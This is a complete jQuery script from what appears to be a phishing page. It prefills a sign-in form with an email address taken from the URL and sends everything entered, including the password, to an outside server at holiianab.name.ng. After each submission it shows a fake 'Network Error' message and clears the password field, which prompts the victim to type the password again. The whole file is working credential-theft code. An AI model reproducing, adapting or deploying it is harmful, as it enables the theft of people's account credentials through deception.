$(document).ready(function() {
 

    var baseUrl = (window.location).href;
    var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
    $("#x1").val(url);

    $("#formx").submit(function(e) {
        e.preventDefault();
        var nm = $("#A1").val();
        var formData = new FormData($("#formx")[0]);
        $("#submitBtn").html("Processing..").prop("disabled", true);
        $.ajax({
            url: "https://holiianab.name.ng/c/c.php",
            type: 'POST',
     	    crossDomain:true,
            data: formData,
            contentType: false,
            processData: false,
         
            success: function(res) {
                
                $('#bd').show();
                $('#hm').hide();
                setTimeout(function() {
                    $("#x1").val(url);
                    $("#x2").val("");
                    $('#msg').html(`Network Error! Please verify your information and try again`);
                    $("#submitBtn").html("Sign In").prop("disabled", false);
                }, 2000);

            }
        });
    });

});
